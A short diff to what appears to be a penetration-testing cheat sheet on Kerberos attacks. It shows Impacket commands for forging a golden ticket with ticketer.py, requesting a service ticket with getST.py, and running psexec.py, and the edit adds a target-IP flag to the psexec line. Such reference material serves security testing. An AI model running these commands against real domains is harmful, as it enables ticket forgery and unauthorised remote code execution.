@@ -230,7 +230,7 @@ ticketer.py -nthash <krbtgthash> -domain-sid <sid> -user-id 500 -domain <domain>
 getST.py -k -no-pass -dc-ip <IP> -spn cifs/<FQDNMachine> <domain>/<user>
 ```
 ```
-psexec.py -k -no-pass -dc-ip <IP> <domain>/<user>@<FQDNMachine>
+psexec.py -k -no-pass -dc-ip <IP> -target-ip <IP> <domain>/<user>@<FQDNMachine>
 ```
 ### With Mimikatz
 ```
